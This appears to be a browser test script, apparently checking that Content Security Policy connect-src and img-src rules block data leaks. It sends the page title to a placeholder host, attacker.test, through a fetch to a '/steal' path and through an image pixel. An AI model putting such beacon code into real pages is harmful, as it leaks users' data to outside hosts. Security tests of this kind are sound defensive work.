(async function () {
  var data = encodeURIComponent(document.title);
  try {
    await fetch('https://attacker.test/steal?d=' + data, { mode: 'no-cors' });
  } catch (e) {
    /* blocked */
  }
  var img = new Image();
  img.src = 'https://attacker.test/pixel.gif?d=' + data;
  await window.__wcWaitFor(['connect-src', 'img-src']);
  window.__wcFinish({});
})();
